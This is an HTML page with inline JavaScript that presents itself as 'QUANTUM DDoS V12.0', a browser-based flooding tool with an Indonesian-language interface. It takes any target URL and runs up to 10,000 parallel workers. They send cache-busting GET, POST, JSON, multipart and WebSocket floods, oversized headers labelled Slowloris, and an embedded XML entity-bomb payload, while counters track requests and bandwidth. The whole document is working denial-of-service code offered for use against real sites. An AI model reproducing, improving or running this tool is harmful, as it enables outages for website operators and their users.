<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‚ö° QSUIKA DDoS V12.0 ‚ö°</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            width: 100%;
            background: #111;
            border: 3px solid #0f0;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 0 50px #0f0;
        }
        
        h1 {
            text-align: center;
            color: #0f0;
            margin-bottom: 20px;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 3px;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #0f0;
            font-size: 14px;
        }
        
        input, select {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 2px solid #0f0;
            color: #0f0;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #ff0;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        
        .stat-box {
            background: #222;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 10px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 20px;
            font-weight: bold;
            color: #0f0;
        }
        
        .stat-label {
            font-size: 10px;
            color: #888;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: #0f0;
            color: #000;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
            transition: 0.3s;
        }
        
        button:hover {
            background: #0c0;
            transform: scale(1.02);
            box-shadow: 0 0 30px #0f0;
        }
        
        button.stop {
            background: #f00;
            color: white;
        }
        
        button.stop:hover {
            background: #c00;
            box-shadow: 0 0 30px #f00;
        }
        
        .log {
            background: #222;
            border: 1px solid #0f0;
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .log-entry {
            color: #0f0;
            margin: 3px 0;
            border-bottom: 1px solid #333;
            padding: 3px 0;
        }
        
        .log-error {
            color: #f00;
        }
        
        .log-success {
            color: #ff0;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 10px;
        }
        
        .warning {
            background: #330;
            border: 1px solid #ff0;
            color: #ff0;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ö° QUANTUM DDoS V12.0 ‚ö°</h1>
        
        <div class="warning">
            ‚ö†Ô∏è WARNING: Ini tools beneran! Gue gak tanggung jawab kalo lu kena masalah. Pake dengan risiko sendiri.
        </div>
        
        <div class="input-group">
            <label>üéØ Target URL:</label>
            <input type="url" id="targetUrl" placeholder="https://target.com" value="https://example.com">
        </div>
        
        <div class="input-group">
            <label>‚öôÔ∏è Attack Method:</label>
            <select id="attackMethod">
                <option value="http">HTTP Flood (GET)</option>
                <option value="https">HTTPS Flood</option>
                <option value="post">POST Flood</option>
                <option value="slow">Slowloris</option>
                <option value="xml">XML Bomb</option>
                <option value="json">JSON Flood</option>
                <option value="websocket">WebSocket Flood</option>
                <option value="multipart">Multipart Flood</option>
            </select>
        </div>
        
        <div class="input-group">
            <label>üìä Threads (Koneksi Paralel):</label>
            <input type="number" id="threads" min="1" max="10000" value="100">
        </div>
        
        <div class="input-group">
            <label>‚è±Ô∏è Delay (ms):</label>
            <input type="number" id="delay" min="0" max="10000" value="10">
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-value" id="sentCount">0</div>
                <div class="stat-label">PACKETS SENT</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="successCount">0</div>
                <div class="stat-label">SUCCESS</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="failedCount">0</div>
                <div class="stat-label">FAILED</div>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-value" id="bandwidth">0</div>
                <div class="stat-label">MB SENT</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="speed">0</div>
                <div class="stat-label">REQ/S</div>
            </div>
            <div class="stat-box">
                <div class="stat-value" id="uptime">0s</div>
                <div class="stat-label">UPTIME</div>
            </div>
        </div>
        
        <button id="startBtn" onclick="startAttack()">üöÄ MULAI SERANGAN</button>
        <button id="stopBtn" class="stop" onclick="stopAttack()" style="display: none;">‚èπÔ∏è HENTIKAN SERANGAN</button>
        
        <div class="log" id="log"></div>
        
        <div class="footer">
            ‚ö° Quantum V12.0 - ¬© SuikaRYP<br>
            ‚ö†Ô∏è GUNAKAN DENGAN BIJAK, SAYANGI NYAWA
        </div>
    </div>
    
    <script>
        // QUANTUM DDoS ENGINE - REAL DEAL
        let attackActive = false;
        let sentCount = 0;
        let successCount = 0;
        let failedCount = 0;
        let totalBytes = 0;
        let workers = [];
        let startTime = Date.now();
        
        function log(message, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            if (type === 'error') entry.className += ' log-error';
            if (type === 'success') entry.className += ' log-success';
            
            const timestamp = new Date().toLocaleTimeString();
            entry.innerHTML = `[${timestamp}] ${message}`;
            
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
            
            // Batasi log
            if (logDiv.children.length > 100) {
                logDiv.removeChild(logDiv.children[0]);
            }
        }
        
        function updateStats() {
            document.getElementById('sentCount').textContent = sentCount.toLocaleString();
            document.getElementById('successCount').textContent = successCount.toLocaleString();
            document.getElementById('failedCount').textContent = failedCount.toLocaleString();
            document.getElementById('bandwidth').textContent = (totalBytes / (1024 * 1024)).toFixed(2);
            
            const uptime = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('uptime').textContent = uptime + 's';
            
            const speed = Math.floor(sentCount / (uptime || 1));
            document.getElementById('speed').textContent = speed;
        }
        
        async function sendRequest(target, method) {
            if (!attackActive) return;
            
            try {
                sentCount++;
                
                // Buat random parameter untuk bypass cache
                const randomParam = Math.random().toString(36).substring(7);
                const url = target.includes('?') ? 
                    `${target}&_=${randomParam}` : 
                    `${target}?_=${randomParam}`;
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);
                
                let response;
                let bytes = 0;
                
                switch(method) {
                    case 'http':
                    case 'https':
                        response = await fetch(url, {
                            method: 'GET',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'Accept': '*/*',
                                'Accept-Language': 'en-US,en;q=0.9',
                                'Connection': 'keep-alive',
                                'Pragma': 'no-cache',
                                'Cache-Control': 'no-cache'
                            }
                        });
                        bytes = 1024;
                        break;
                        
                    case 'post':
                        response = await fetch(url, {
                            method: 'POST',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            },
                            body: `data=${randomParam.repeat(1000)}`
                        });
                        bytes = 2048;
                        break;
                        
                    case 'slow':
                        // Slowloris - keep connections open
                        response = await fetch(url, {
                            method: 'GET',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'X-a': 'a'.repeat(10000) // Header besar
                            }
                        });
                        bytes = 10240;
                        break;
                        
                    case 'xml':
                        // XML Bomb
                        const xmlData = `<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>`;
                        
                        response = await fetch(url, {
                            method: 'POST',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'Content-Type': 'application/xml',
                                'User-Agent': 'Mozilla/5.0'
                            },
                            body: xmlData
                        });
                        bytes = 102400;
                        break;
                        
                    case 'json':
                        // JSON Flood
                        const jsonData = JSON.stringify({
                            data: randomParam.repeat(10000)
                        });
                        
                        response = await fetch(url, {
                            method: 'POST',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0'
                            },
                            body: jsonData
                        });
                        bytes = 20480;
                        break;
                        
                    case 'websocket':
                        // WebSocket Flood (if supported)
                        if (typeof WebSocket !== 'undefined') {
                            const wsUrl = url.replace('http', 'ws');
                            const ws = new WebSocket(wsUrl);
                            setTimeout(() => ws.close(), 100);
                        }
                        bytes = 512;
                        break;
                        
                    case 'multipart':
                        // Multipart form flood
                        const boundary = '----WebKitFormBoundary' + randomParam;
                        const body = `--${boundary}\r\n` +
                            `Content-Disposition: form-data; name="field1"\r\n\r\n` +
                            `${randomParam.repeat(5000)}\r\n` +
                            `--${boundary}--`;
                        
                        response = await fetch(url, {
                            method: 'POST',
                            mode: 'no-cors',
                            cache: 'no-store',
                            signal: controller.signal,
                            headers: {
                                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                                'User-Agent': 'Mozilla/5.0'
                            },
                            body: body
                        });
                        bytes = 51200;
                        break;
                }
                
                clearTimeout(timeoutId);
                
                successCount++;
                totalBytes += bytes;
                
                if (successCount % 100 === 0) {
                    log(`‚úÖ Success: ${successCount} requests`, 'success');
                }
                
            } catch (error) {
                failedCount++;
                if (failedCount % 100 === 0) {
                    log(`‚ùå Failed: ${error.message}`, 'error');
                }
            }
            
            updateStats();
        }
        
        async function workerTask(target, method, delay) {
            while (attackActive) {
                await sendRequest(target, method);
                if (delay > 0) {
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
        }
        
        function startAttack() {
            const target = document.getElementById('targetUrl').value;
            const method = document.getElementById('attackMethod').value;
            const threads = parseInt(document.getElementById('threads').value);
            const delay = parseInt(document.getElementById('delay').value);
            
            if (!target) {
                log('‚ùå Masukin target dulu tolol!', 'error');
                return;
            }
            
            // Validasi URL
            try {
                new URL(target);
            } catch {
                log('‚ùå URL gak valid, kasih http:// atau https://', 'error');
                return;
            }
            
            attackActive = true;
            sentCount = 0;
            successCount = 0;
            failedCount = 0;
            totalBytes = 0;
            startTime = Date.now();
            
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('stopBtn').style.display = 'block';
            
            log(`üöÄ MULAI SERANGAN ke ${target}`);
            log(`üìä Method: ${method.toUpperCase()}, Threads: ${threads}, Delay: ${delay}ms`);
            
            // Start workers
            for (let i = 0; i < threads; i++) {
                workerTask(target, method, delay);
            }
            
            // Update stats every second
            const statsInterval = setInterval(() => {
                if (!attackActive) {
                    clearInterval(statsInterval);
                }
                updateStats();
            }, 1000);
        }
        
        function stopAttack() {
            attackActive = false;
            workers = [];
            
            document.getElementById('startBtn').style.display = 'block';
            document.getElementById('stopBtn').style.display = 'none';
            
            const duration = Math.floor((Date.now() - startTime) / 1000);
            log(`‚èπÔ∏è SERANGAN DIHENTIKAN setelah ${duration} detik`);
            log(`üìä Total: ${sentCount} requests, ${(totalBytes/(1024*1024)).toFixed(2)} MB`);
        }
        
        // Disable right click
        document.addEventListener('contextmenu', e => e.preventDefault());
        
        // Log startup
        log('‚ö° QUANTUM DDoS ENGINE READY');
        log('‚ö†Ô∏è GUNAKAN DENGAN BIJAK, SAYANGI NYAWA');
    </script>
</body>
</html>
